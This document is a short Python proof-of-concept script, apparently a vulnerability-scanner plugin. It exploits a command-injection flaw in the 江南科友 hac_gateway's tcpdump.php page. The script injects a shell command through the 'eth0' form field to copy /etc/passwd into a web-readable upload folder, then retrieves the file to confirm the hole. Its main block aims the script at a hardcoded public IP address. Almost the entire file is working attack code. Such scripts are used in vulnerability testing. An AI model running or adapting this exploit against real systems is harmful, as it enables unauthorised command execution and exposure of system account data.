#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  江南科友命令执行 1
Author    :  a
mail      :  a@lcx.cc
refer     :  wooyun-2014-077033
"""
import urlparse

def assign(service, arg):
    if service == 'hac_gateway':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    #命令执行1
    path='system/tcpdump.php'
    raw='''POST /system/tcpdump.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 111

op_type=downloadcatch&eth0=1 | cp /etc/passwd /usr/local/apache2/htdocs/project/www/upload/123.txt | 1&dump='''
    target = arg + path
    code, head, res, errcode, _ = curl.curl2(target,raw=raw)
    target=arg+'upload/123.txt'
    code, head, res, errcode, _ = curl.curl2(target)
    if code==200 and ('root:x:' in res) and ('hacuser:x' in res):
        security_hole(target)
    
if __name__ == '__main__': 
    from dummy import *
    audit(assign('hac_gateway','https://123.124.158.72/')[1])